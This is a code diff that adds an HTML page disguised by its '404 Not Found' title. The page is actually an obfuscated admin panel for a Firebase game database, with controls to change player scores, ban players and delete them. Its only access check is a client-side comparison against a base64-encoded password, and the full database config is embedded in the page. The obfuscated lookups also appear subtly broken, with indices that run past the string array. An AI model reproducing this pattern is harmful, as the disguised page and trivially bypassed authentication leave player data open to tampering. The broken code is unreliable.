@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Not Found</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-database-compat.js"></script>
+    <style>
+        body { font-family: Arial; background: #1a1a1a; color: #fff; }
+        .container { display: none; padding: 20px; }
+        .login { text-align: center; padding: 20px; }
+        input, select { padding: 10px; margin: 5px; width: 200px; }
+        button { padding: 10px 20px; margin: 5px; background: #ff4d4d; color: white; border: none; cursor: pointer; }
+        .player-list { margin: 20px 0; }
+        .action-panel { display: none; }
+        .error { color: #ff4d4d; }
+    </style>
+</head>
+<body>
+    <div id="login" class="login">
+        <input type="password" id="adminPass" placeholder="Password">
+        <button onclick="auth(document.getElementById('adminPass').value)">Access</button>
+    </div>
+    <div id="container" class="container">
+        <h2>Admin Panel</h2>
+        <div class="player-list">
+            <select id="playerSelect" onchange="loadPlayerData()"></select>
+            <input type="number" id="newScore" placeholder="New Score">
+            <button onclick="updateScore()">Update Score</button>
+            <button onclick="banPlayer()">Ban Player</button>
+            <button onclick="removePlayer()">Remove Player</button>
+        </div>
+        <div id="playerInfo"></div>
+    </div>
+    <script>
+        const _0x4f8d=['value','hearts','database','child','once','val','forEach','option','createElement','text','appendChild','selectedIndex','newScore','getElementById','update','banned','banReason','Banned by admin','reload','remove','innerHTML','<option value="">Select Player</option>','key','name','Player banned','Score updated','Invalid password','style','display','block','none','initializeApp'];(function(_0x39970d,_0x4f8d89){const _0x41b2bf=function(_0x63c4f1){while(--_0x63c4f1){_0x39970d['push'](_0x39970d['shift']());}};_0x41b2bf(++_0x4f8d89);}(_0x4f8d,0x1d7));const _0x41b2=function(_0x39970d,_0x4f8d89){_0x39970d=_0x39970d-0x0;let _0x41b2bf=_0x4f8d[_0x39970d];return _0x41b2bf;};
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBinhf3-PpbAeQaQKToNnLHBBBxVQeLbp4",
+            authDomain: "yayy-93c45.firebaseapp.com",
+            databaseURL: "https://yayy-93c45-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "yayy-93c45",
+            storageBucket: "yayy-93c45.appspot.com",
+            messagingSenderId: "281901593072",
+            appId: "1:281901593072:web:614dff92e64d25669c6d35",
+            measurementId: "G-JB3PWXQ56M"
+        };
+
+        firebase[_0x41b2('0x0')](firebaseConfig);
+        const db = firebase[_0x41b2('0x1')]();
+        const playersRef = db.ref('players');
+        
+        function auth(_p) {
+            const _h = 'c2VjcmV0YWRtaW5wYXNzd29yZA==';
+            if (atob(_h) === _p) {
+                document[_0x41b2('0x2')]('login')[_0x41b2('0x3')][_0x41b2('0x4')] = _0x41b2('0x5');
+                document[_0x41b2('0x2')]('container')[_0x41b2('0x3')][_0x41b2('0x4')] = _0x41b2('0x6');
+                loadPlayers();
+            } else {
+                alert(_0x41b2('0x7'));
+            }
+        }
+
+        function loadPlayers() {
+            const select = document[_0x41b2('0x2')]('playerSelect');
+            select[_0x41b2('0x8')] = _0x41b2('0x9');
+            playersRef[_0x41b2('0xa')](_0x41b2('0xb'))[_0x41b2('0xc')](snapshot => {
+                snapshot[_0x41b2('0xd')](child => {
+                    const player = child[_0x41b2('0xe')]();
+                    if (player && player[_0x41b2('0xf')]) {
+                        const opt = document[_0x41b2('0x10')](_0x41b2('0x11'));
+                        opt[_0x41b2('0xb')] = child[_0x41b2('0x12')];
+                        opt[_0x41b2('0x13')] = `${player[_0x41b2('0xf')]} (${player[_0x41b2('0x14')] || 0} hearts)`;
+                        select[_0x41b2('0x15')](opt);
+                    }
+                });
+            });
+        }
+
+        function updateScore() {
+            const select = document[_0x41b2('0x2')]('playerSelect');
+            const playerKey = select.options[select[_0x41b2('0x16')]][_0x41b2('0xb')];
+            const newScore = parseInt(document[_0x41b2('0x2')](_0x41b2('0x17'))[_0x41b2('0xb')]);
+            
+            if (playerKey && !isNaN(newScore)) {
+                playersRef[_0x41b2('0x18')](playerKey)[_0x41b2('0x19')]({
+                    hearts: newScore,
+                    lastUpdate: firebase[_0x41b2('0x1')].ServerValue.TIMESTAMP
+                }).then(() => {
+                    alert(_0x41b2('0x1a'));
+                    loadPlayers();
+                });
+            }
+        }
+
+        function banPlayer() {
+            const select = document[_0x41b2('0x2')]('playerSelect');
+            const playerKey = select.options[select[_0x41b2('0x16')]][_0x41b2('0xb')];
+            
+            if (playerKey) {
+                playersRef[_0x41b2('0x18')](playerKey)[_0x41b2('0x19')]({
+                    [_0x41b2('0x1b')]: true,
+                    [_0x41b2('0x1c')]: _0x41b2('0x1d'),
+                    banTimestamp: firebase[_0x41b2('0x1')].ServerValue.TIMESTAMP
+                }).then(() => {
+                    alert(_0x41b2('0x1e'));
+                    loadPlayers();
+                });
+            }
+        }
+
+        function removePlayer() {
+            const select = document[_0x41b2('0x2')]('playerSelect');
+            const playerKey = select.options[select[_0x41b2('0x16')]][_0x41b2('0xb')];
+            
+            if (playerKey && confirm('Are you sure you want to remove this player?')) {
+                playersRef[_0x41b2('0x18')](playerKey)[_0x41b2('0x1f')]()
+                    .then(() => {
+                        alert('Player removed');
+                        location[_0x41b2('0x20')]();
+                    });
+            }
+        }
+    </script>
+</body>
+</html> 
